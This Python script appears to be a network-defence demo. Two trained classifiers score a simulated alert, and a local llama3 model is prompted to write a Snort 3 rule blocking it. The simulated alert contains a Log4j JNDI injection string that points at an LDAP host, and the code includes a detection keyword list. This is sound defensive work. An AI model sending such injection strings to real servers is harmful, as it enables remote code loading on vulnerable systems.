import joblib
import ollama
import pandas as pd
import re
import time

def engineer_features_for_single_alert(alert_info):
    """
    Performs the same feature engineering on a single new alert
    that was done on the training data.
    """
    message = alert_info['message']
    
    df = pd.DataFrame([{
        'message': message,
        'dest_port': int(alert_info['dest_port'])
    }])
    
    df['message_length'] = df['message'].str.len()
    special_chars = r'[\$\{\}\(\)\'\/]'
    df['special_char_count'] = df['message'].str.count(special_chars)
    keywords = ['select', 'union', 'script', 'jndi', 'ldap', 'payload']
    keyword_pattern = '|'.join(keywords)
    df['keyword_count'] = df['message'].str.lower().str.count(keyword_pattern)
    
    return df[['dest_port', 'message_length', 'special_char_count', 'keyword_count', 'message']]


def generate_snort_rule_prompt(alert_info):
    """
    Constructs a highly specific prompt for Ollama to generate a production-ready Snort rule.
    """
    src_ip = alert_info['source_ip']
    dst_port = alert_info['dest_port']
    # Simple logic to extract a likely payload substring for the prompt example
    payload_hint = alert_info['message']
    if "payload=" in payload_hint:
        try:
            payload_hint = payload_hint.split("payload=")[1].split(" ")[0]
        except: pass

    prompt = f"""
    You are a Snort 3 expert. Write a strict, production-ready Snort 3 rule to block the following threat.
    
    THREAT DETAILS:
    - Source IP: {src_ip}
    - Destination Port: {dst_port}
    - Full Alert Text: "{alert_info['message']}"

    STRICT REQUIREMENTS:
    1. HEADER: Use 'alert tcp any any -> $HOME_NET {dst_port}'. Do NOT hardcode the destination IP.
    2. CONTENT: Match ONLY the specific malicious part of the payload (e.g., '{payload_hint}'), not the entire request.
    3. METADATA:
       - flow:to_server, established
       - classtype:attempted-admin
       - sid:1000005 (or higher)
       - rev:1
    4. FORMAT: Output ONLY the raw rule line. No markdown, no explanations.

    CORRECT EXAMPLE:
    alert tcp any any -> $HOME_NET 80 (msg:"MALWARE-OTHER Log4j JNDI injection attempt"; flow:to_server,established; content:"${{jndi:ldap://"; fast_pattern; classtype:attempted-admin; sid:1000005; rev:1;)

    OUTPUT:
    """
    return prompt

# --- Main Execution ---
if __name__ == "__main__":
    # 1. Load models
    try:
        classifier_pipeline = joblib.load('random_forest_pipeline.joblib')
        anomaly_pipeline = joblib.load('isolation_forest_pipeline.joblib')
    except FileNotFoundError as e:
        print(f"Error: Could not find model file: {e.filename}")
        exit()

    # 2. Simulate Alert (Log4j)
    new_alert_info = {
        'message': 'GET /?payload=${jndi:ldap://192.168.1.6:1389/a} HTTP/1.1',
        'source_ip': '192.168.1.6',
        'dest_port': '8080',
        'protocol': 'tcp'
    }

    # 3. Predict
    new_alert_df = engineer_features_for_single_alert(new_alert_info)
    classifier_prediction = classifier_pipeline.predict(new_alert_df)
    anomaly_prediction = anomaly_pipeline.predict(new_alert_df)

    print("--- Hybrid Model Analysis ---")
    print(f"Classifier Prediction: {'MALICIOUS' if classifier_prediction[0] == 1 else 'Benign'}")
    print(f"Anomaly Prediction:    {'ANOMALY' if anomaly_prediction[0] == -1 else 'Normal'}")
    print("-----------------------------")

    if classifier_prediction[0] == 1 or anomaly_prediction[0] == -1:
        print("\n[SUCCESS] Threat detected.")
        print("Requesting optimized rule from Ollama...")
        
        prompt = generate_snort_rule_prompt(new_alert_info)
        
        try:
            response = ollama.chat(
                model='llama3', # Or llama3.1 if you pulled it
                messages=[{'role': 'user', 'content': prompt}],
                stream=False
            )
            
            rule = response['message']['content']
            
            # --- Post-Processing / Cleaning ---
            rule = rule.replace('```', '').replace('snort', '').strip()
            rule = re.sub(' +', ' ', rule) # Remove double spaces
            
            print("\n--- Suggested Rule ---")
            print(rule)
            print("----------------------")

            # Save with overwrite to keep file clean for demo
            with open("suggested_rules.txt", "w") as f: 
                f.write(f"# Rule for Log4j Alert\n")
                f.write(rule + "\n")
            print("Rule saved to suggested_rules.txt")

        except Exception as e:
            print(f"\nError communicating with Ollama: {e}")
    else:
        print("\nSystem classified threat as Benign.")